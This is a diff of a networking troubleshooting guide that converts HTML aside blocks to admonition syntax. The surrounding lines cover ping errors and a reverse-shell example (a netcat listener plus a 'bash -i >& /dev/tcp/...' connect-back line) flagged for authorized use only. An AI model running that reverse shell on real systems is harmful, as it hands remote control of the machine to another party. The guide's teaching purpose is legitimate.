@@ -169,7 +169,7 @@ ping -c 1 -t 1 8.8.8.8  # Will fail with "Time to live exceeded"
 2. **Destination Host Unreachable:** The local router cannot reach the destination network.
 3. **Permission Denied:** Requires root for raw ICMP sockets, or the binary is not installed.
 
-<aside class="starlight-aside starlight-aside--caution">
+:::caution
 `nc -zv` or `curl` to test TCP connectivity as an alternative. ICMP blocking is common in cloud
 Environments (AWS security groups do not allow ICMP by default).
 
@@ -504,9 +504,8 @@ nc -lvnp 4444
 # Target connects back (only on authorized systems!)
 bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
 ```
-
-</aside>
-<aside class="starlight-aside starlight-aside--danger">
+:::
+:::danger
 Using them without authorization is illegal.
 
 ## curl
@@ -1081,8 +1080,7 @@ for mastery of this topic.
 
 Worked examples demonstrating the application of key concepts are covered in the detailed sub-pages
 linked above.
-
-</aside>
+:::
 ## Intuition
 
 Network troubleshooting is like detective work - you follow clues from the physical layer up. `ping` is like knocking on someone's door to see if they are home. `traceroute` is like asking each post office along the way to tell you which path your letter took. `tcpdump` is like secretly reading every letter that passes through your mailbox. `dig` is like calling directory assistance to look up someone's address. The OSI-layer approach works because each layer depends on the one below it - if the cable is unplugged (Layer 1), nothing else matters. The key insight is that most network problems are simple (cable unplugged, DNS misconfigured, firewall blocking), so always start with the basics before diving into packet captures.
